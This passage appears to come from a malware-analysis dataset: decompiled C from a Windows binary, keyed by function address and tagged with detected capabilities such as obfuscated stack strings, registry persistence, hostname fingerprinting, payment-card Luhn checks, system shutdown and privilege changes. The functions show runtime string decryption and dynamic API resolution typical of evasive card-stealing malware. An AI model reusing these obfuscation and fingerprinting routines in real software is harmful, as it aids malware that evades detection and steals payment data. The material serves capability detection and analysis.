0x7c6a6a33;\n        var_efh = 0x78337a59;\n        var_ebh = 0x6f596f6a;\n        var_e7h = 0x616a6633;\n        var_e3h = 0x13337859;\n        var_dfh = 0x2f592e6a;\n        var_dbh = 0x2f6a6a33;\n        var_d7h = 0x2f333f59;\n        var_d3h = 0x7a59256a;\n        var_cfh = 0x616a2b33;\n        var_cbh = 0x2f333459;\n        var_c7h = 0x7a59366a;\n        var_c3h = 0x246a3c33;\n        var_bfh = 0x39332859;\n        var_bbh = 0x3559286a;\n        var_b7h = 0x616a2433;\n        var_b3h = 0x2c333559;\n        var_afh = 0x3b59616a;\n        var_abh = 0x376a2e33;\n        var_a7h = 0x2b332a59;\n        var_a3h = 0x3159226a;\n        var_9fh = 0x256a6433;\n        var_9bh = 0x26333659;\n        var_97h = 0x5759636a;\n        var_93h = 0x4c6a4033;\n        var_8fh = 0x11335059;\n        var_8bh = 0x3f59056a;\n        var_87h = 0x206a2c33;\n        var_83h = 0x26332f59;\n        var_7fh = 0x1359356a;\n        var_7bh = 0x326a2433;\n        var_77h = 0x2b332e59;\n        var_73h = 0x36592d6a;\n        var_6fh = 0x4c6a1733;\n        var_6bh = 0x18335059;\n        var_67h = 0x3459346a;\n        var_63h = 0x336a1a33;\n        var_5fh = 0x19333f59;\n        var_5bh = 0x2e59246a;\n        var_57h = 0x316a3f33;\n        var_53h = 0x25331959;\n        var_4fh = 0x37592c6a;\n        var_4bh = 0x2f6a2b33;\n        var_47h = 0x39333e59;\n        var_43h = 0x6759616a;\n        var_3fh = 0x646a6a33;\n        var_3bh = 0x70332959;\n        var_37h = 0x5759736a;\n        var_33h = 0x4c6a4033;\n        var_2fh = 0x11335059;\n        var_2bh = 0x2959646a;\n        var_27h = 0x4c6a1733;\n        var_23h = 0x6f335059;\n        var_1fh = 0x5759326a;\n        var_1bh = 0x416a4033;\n        var_17h._0_1_ = 0x59;\n        var_ch = 0x335a5941;\n        var_8h._0_2_ = 0x6a4a;\n        uVar17 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x275);\n        piVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar17);\n        uVar11 = 0;\n        do {\n            *(piVar10 + uVar11) = *(piVar10 + uVar11) + '\\x1a';\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x275);\n        sub.ntdll.dll_memset(piVar10, 0, 0x275);\n        var_158h = 0;\n        lpWideCharStr = &var_150h - piVar10;\n        do {\n            pcVar19 = piVar10 + var_158h;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_ch + var_158h % 6);\n            uVar3 = pcVar19[lpWideCharStr];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_158h = var_158h + 1;\n            *pcVar19 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (var_158h < 0x13a);\n        piVar14 = piVar10;\n        do {\n            iVar4 = *piVar14;\n            piVar14 = piVar14 + 1;\n        } while (iVar4 != 0);\n        piVar15 = piVar9;\n        do {\n            iVar4 = *piVar15;\n            piVar15 = piVar15 + 1;\n        } while (iVar4 != 0);\n        piVar18 = piVar9;\n        do {\n            iVar4 = *piVar18;\n            piVar18 = piVar18 + 1;\n        } while (iVar4 != 0);\n        lpWideCharStr = in_ECX + 1;\n        piVar16 = in_ECX;\n        do {\n            iVar4 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar4 != 0);\n        uVar17 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar16 - lpWideCharStr >> 1) + (piVar18 - (piVar9 + 1) >> 1) +\n                                (piVar15 - (piVar9 + 1) >> 1) + (piVar14 - (piVar10 + 1) >> 1)) * 2 + 8);\n        iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar17);\n        lpWideCharStr = iVar12;\n        (*_sym.imp.USER32.dll_wsprintfW)(iVar12, piVar10, piVar9, piVar9, in_ECX);\n        if (iVar12 == 0) {\n            pcVar19 = NULL;\n        }\n        else {\n            iVar12 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar12);\n            iVar12 = iVar12 * 2 + 2;\n            uVar17 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar12);\n            pcVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar17);\n            *pcVar19 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, lpWideCharStr, 0xffffffff, pcVar19, iVar12, 0, 0);\n        }\n        pcVar1 = pcVar19 + 1;\n        *in_EDX = pcVar19;\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        do {\n            cVar7 = *pcVar19;\n            pcVar19 = pcVar19 + 1;\n        } while (cVar7 != '\\0');\n        *arg_8h = pcVar19 - pcVar1;\n        uVar17 = 1;\n        uVar13 = (*pcVar6)(0, piVar9);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar13);\n        uVar11 = 0;\n        do {\n            *(piVar10 + uVar11) = *(piVar10 + uVar11) + '\\x16';\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x275);\n        uVar13 = (*pcVar6)(0, piVar10);\n        (*pcVar5)(uVar13);\n    }\n    return uVar17;\n}\n",
        "token_count": 3031
    },
    "0040a22a": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "set registry value",
            "get hostname",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a22a(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x415d3c;\n    uStack104 = *0x415d38;\n    uStack108 = *0x415d34;\n    name = *0x415d30;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x427a00;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x415d40;\n    uStack92 = *0x415d44;\n    uStack88 = *0x415d48;\n    uStack84 = *0x415d4c;\n    var_3ch = *0x415d20;\n    uStack60 = *0x415d24;\n    uStack56 = *0x415d28;\n    uStack52 = *0x415d2c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x427a08 = uVar10 ^ uVar8;\n        *0x427a0c = uVar10 << 10 | uVar10 >> 0x16;\n        *0x427a00 = uVar8;\n        *0x427a04 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1707
    },
    "0040dcd0": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040dcd0(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint extraout_ECX;\n    int32_t iVar9;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpModuleName;\n    \n    var_24h = 0x1c3a2734;\n    var_20h = 0x1922033a;\n    var_1ch = 0x37102a1d;\n    var_18h._0_1_ = 0x48;\n    var_14h = 0x68484e62;\n    var_10h._0_1_ = 0x4f;\n    fcn.004034f7(param_1);\n    iVar9 = var_8h;\n    var_ch = &var_24h - var_8h;\n    lpModuleName = 0;\n    do {\n        iVar5 = lpModuleName;\n        pcVar1 = lpModuleName + iVar9;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + iVar5 % 5);\n        uVar3 = pcVar1[var_ch];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        lpModuleName = lpModuleName + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (lpModuleName < 0xd);\n    var_24h = 0xb07363b;\n    var_20h = 0x47603c0a;\n    var_1ch = 0x3f3c0b4b;\n    var_18h._0_1_ = 0x75;\n    var_14h = 0x65755350;\n    var_10h._0_1_ = 0x6f;\n    fcn.004034a8(extraout_ECX);\n    iVar9 = 0;\n    do {\n        fcn.004034cf(iVar9, *(&var_14h + iVar9 % 5) ^ *(&var_24h + iVar9));\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xd);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_8h);\n    *0x427b60 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar4)(0, var_8h);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    return;\n}\n",
        "token_count": 738
    },
    "0040dddd": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040dddd(int32_t param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x427b58 == NULL) {\n        var_2ch = 0x2c19112a;\n        var_28h = 0x3257003f;\n        var_24h = 0x532b2c3c;\n        var_20h._0_2_ = 0x1110;\n        var_20h._2_1_ = 0x4e;\n        var_1ch = 0x434e6263;\n        var_18h._0_2_ = 0x3648;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        puVar8 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n        lpModuleName = 0;\n        *puVar8 = 0;\n        puVar8[1] = 0;\n        puVar8[2] = 0;\n        puVar8[3] = 0;\n        var_10h = &var_2ch - puVar8;\n        do {\n            iVar10 = lpModuleName;\n            pcVar1 = lpModuleName + puVar8;\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_1ch + iVar10 % 6);\n            uVar3 = pcVar1[var_10h];\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            lpModuleName = lpModuleName + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (lpModuleName < 0xf);\n        var_2ch = 0xb07363b;\n        var_28h = 0x47603c0a;\n        var_24h = 0x3f3c0b4b;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x75);\n        var_10h = 0x65755350;\n        var_ch._0_1_ = 0x6f;\n        fcn.004034a8(extraout_ECX);\n        iVar10 = 0;\n        do {\n            fcn.004034cf(iVar10, *(&var_10h + iVar10 % 5) ^ *(&var_2ch + iVar10));\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0xd);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar8);\n        *0x427b58 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n        uVar7 = (*pcVar4)(0, puVar8);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n        if (*0x427b58 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar10 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar10 != 0)) {\n        iVar9 = (**0x427b58)(iVar10, &var_4h);\n        var_4h = var_4h & -(iVar9 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar10);\n    }\n    return var_4h;\n}\n",
        "token_count": 1018
    },
    "0040df50": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040df50(int32_t param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint extraout_ECX;\n    uint *puVar10;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x427634;\n    var_14h = param_1;\n    if (*0x427b5c == NULL) {\n        var_4ch = 0x4255d6f;\n        var_48h = 0x5356215e;\n        var_44h = 0x330f5e30;\n        var_40h._0_2_ = 0x4557;\n        var_40h._2_1_ = 100;\n        var_40h._3_1_ = 6;\n        var_3ch = 0x576a172c;\n        var_38h = 0x1185b36;\n        var_34h = 0x5d3b465b;\n        var_30h._0_2_ = 0x6404;\n        var_1ch = 0x32523238;\n        var_18h._0_2_ = 0x646a;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n        lpModuleName = 0;\n        puVar10 = puVar7;\n        for (iVar9 = 7; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *puVar10 = 0;\n        *(puVar10 + 2) = 0;\n        var_10h = &var_4ch - puVar7;\n        do {\n            iVar9 = lpModuleName;\n            pcVar1 = lpModuleName + puVar7;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_1ch + iVar9 % 6);\n            uVar3 = pcVar1[var_10h];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            lpModuleName = lpModuleName + 1;\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        } while (lpModuleName < 0x1e);\n        var_2ch = 0xb07363b;\n        var_28h = 0x47603c0a;\n        var_24h = 0x3f3c0b4b;\n        var_20h._0_1_ = 0x75;\n        var_10h = 0x65755350;\n        var_ch._0_1_ = 0x6f;\n        fcn.004034a8(extraout_ECX);\n        iVar9 = 0;\n        do {\n            fcn.004034cf(iVar9, *(&var_10h + iVar9 % 5) ^ *(&var_2ch + iVar9));\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0xd);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar7);\n        *0x427b5c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        uVar6 = (*pcVar8)(0, puVar7);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n        pcVar8 = *0x427b5c;\n        if (*0x427b5c == NULL) goto code_r0x0040e0c7;\n    }\n    iVar9 = var_14h;\n    pcVar8 = (**0x427b5c)(var_14h);\n    if (pcVar8 != '\\0') {\n        *0x427634 = iVar9 != 0;\n    }\ncode_r0x0040e0c7:\n    return pcVar8 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1185
    },
    "0040f405": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040f405(int32_t param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint nNumberOfBytesToWrite;\n    uint extraout_ECX;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uint var_46h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t dwFlags;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t ARG_0;\n    int32_t lpString2;\n    int32_t hHeap;\n    \n    iVar8 = 8;\n    lpString2 = param_1;\n    ARG_0 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, ARG_0 * 2 + 0x1a);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            var_10h = iVar7;\n            uVar6 = (*pcVar9)(8, ARG_0 * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar7, lpString2);\n                var_14h = fcn.00403844();\n                var_14h = var_14h + 2;\n                var_3ch = 0x760e7255;\n                var_38h = 0x625c703a;\n                var_34h = 0x72114f14;\n                var_30h = 0x704f7616;\n                var_1ch = 0x76627270;\n                var_18h._0_1_ = 0x4f;\n                fcn.0040f783(extraout_ECX);\n                iVar8 = 0;\n                ARG_0 = &var_3ch - dwFlags;\n                do {\n                    pcVar1 = dwFlags + iVar8;\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_1ch + iVar8 % 5);\n                    uVar3 = pcVar1[ARG_0];\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar8 = iVar8 + 1;\n                    *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                } while (iVar8 < 0x10);\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar9 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, dwFlags, uVar6);\n                (*pcVar9)(hHeap, 0x415c90, lpString2);\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar8 = 8;\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                if (ARG_0 != 0) {\n                    var_1ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_88h = 0x1b113c54;\n                    var_84h = 0x4868570e;\n                    var_80h = 0x3b18471b;\n                    var_7ch = 0x150f4445;\n                    var_78h = 0x6a58406d;\n                    var_74h = 0x1c40723f;\n                    var_70h = 0x2c3f6a;\n                    var_6ch._0_1_ = 5;\n                    stack0xffffff91 = 0x546d1047;\n                    var_67h = 0x2e5c6d64;\n                    var_63h = 0x5c1f0c45;\n                    var_5fh = 0x4249113b;\n                    var_5bh = 0xe457910;\n                    var_57h._0_1_ = 8;\n                    stack0xffffffa6 = 0x4c452741;\n                    var_52h = 0x1423812;\n                    var_4eh = 0x6d150b0c;\n                    var_4ah = 0x3f6a5940;\n                    var_46h._0_1_ = 0x48;\n                    var_24h = 0x69654835;\n                    var_20h._0_1_ = 0x67;\n                    uVar6 = (*pcVar9)(8, 0x44);\n                    iVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n                    sub.ntdll.dll_memset(iVar7, 0, 0x44);\n                    lpString2 = 0;\n                    var_14h = &var_88h - iVar7;\n                    do {\n                        iVar8 = lpString2;\n                        pcVar1 = lpString2 + iVar7;\n                        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_24h + iVar8 % 5);\n                        uVar3 = pcVar1[var_14h];\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        lpString2 = lpString2 + 1;\n                        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                    } while (lpString2 < 0x43);\n                    uVar6 = var_1ch;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar7, var_1ch, var_1ch);\n                    iVar8 = fcn.00409d1f(nNumberOfBytesToWrite);\n                    if (iVar8 == 0) {\n                        iVar8 = fcn.0040f228(uVar6);\n                    }\n                    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                    uVar6 = (*pcVar9)(0, iVar7);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                }\n                uVar6 = (*pcVar9)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                fcn.0040f752();\n                iVar7 = var_10h;\n            }\n            uVar6 = (*pcVar9)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1786
    },
    "0040f94c": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f94c(uchar *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    int16_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    uchar *puVar12;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != NULL) {\n        var_3ch = 0x45187564;\n        var_38h = 0x77013708;\n        var_34h = 0x75566e32;\n        puVar12 = param_1;\n        for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        var_30h._0_1_ = 5;\n        stack0xffffffcd = 0x29370b45;\n        var_2bh = 0x476e0477;\n        var_27h = 0x2a450775;\n        var_23h = 0x31771437;\n        var_1fh = 0x3b75566e;\n        var_1bh = 0x2370145;\n        var_17h._0_2_ = 0x4577;\n        var_17h._2_1_ = 0x6e;\n        stack0xffffffe8 = 0x45777537;\n        var_10h._0_1_ = 0x6e;\n        var_ch = param_1;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        piVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        uVar9 = 0;\n        do {\n            *(piVar8 + uVar9) = *(piVar8 + uVar9) ^ 0xc9;\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 0x51);\n        sub.ntdll.dll_memset(piVar8, 0, 0x51);\n        var_4h = 0;\n        var_8h = &var_3ch - piVar8;\n        do {\n            iVar10 = var_4h;\n            pcVar1 = piVar8 + var_4h;\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_17h + iVar10 % 5 + 3);\n            uVar3 = pcVar1[var_8h];\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_4h = var_4h + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (var_4h < 0x28);\n        piVar11 = piVar8;\n        do {\n            iVar4 = *piVar11;\n            *((var_ch - piVar8) + piVar11) = iVar4;\n            piVar11 = piVar11 + 1;\n        } while (iVar4 != 0);\n        uVar9 = 0;\n        do {\n            *(piVar8 + uVar9) = *(piVar8 + uVar9) + -0x48;\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 0x51);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    }\n    return;\n}\n",
        "token_count": 963
    },
    "0041106c": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "shutdown system",
            "modify access privileges"
        ],
